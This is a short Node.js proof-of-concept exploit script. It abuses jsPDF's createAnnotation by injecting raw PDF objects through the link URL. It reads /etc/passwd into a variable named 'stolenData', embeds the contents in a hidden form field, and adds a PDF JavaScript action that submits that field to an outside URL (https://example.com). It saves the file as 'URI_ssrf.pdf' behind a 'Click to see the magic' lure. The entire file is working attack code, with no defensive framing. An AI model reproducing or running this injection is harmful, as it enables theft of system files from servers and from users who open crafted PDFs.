const { jsPDF } = require("jspdf");
const fs = require('fs');

// ✅ READ TARGET FILE CONTENTS
const targetFile = '/etc/passwd';  // Linux example (change path as needed)
let stolenData = 'File not found';
try {
  stolenData = fs.readFileSync(targetFile, 'utf8');
} catch(e) {
  stolenData = `Error: ${e.message}`;
}

var doc = new jsPDF();
doc.createAnnotation({
  bounds: {x:0, y:10, w:200, h:200},
  type: 'link',
  url: `#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Tx/T(STOLEN)/V(${stolenData.replace(/%/g,'%25').replace(/\(/g,'%28').replace(/\)/g,'%29')})>>/A<</S/JavaScript/JS(
    app.alert('File exfiltrated!');
    this.submitForm('https://example.com', false, false, ['STOLEN']);
  )/`
});

doc.text(20, 20, 'Click to see the magic');
doc.save("URI_ssrf.pdf");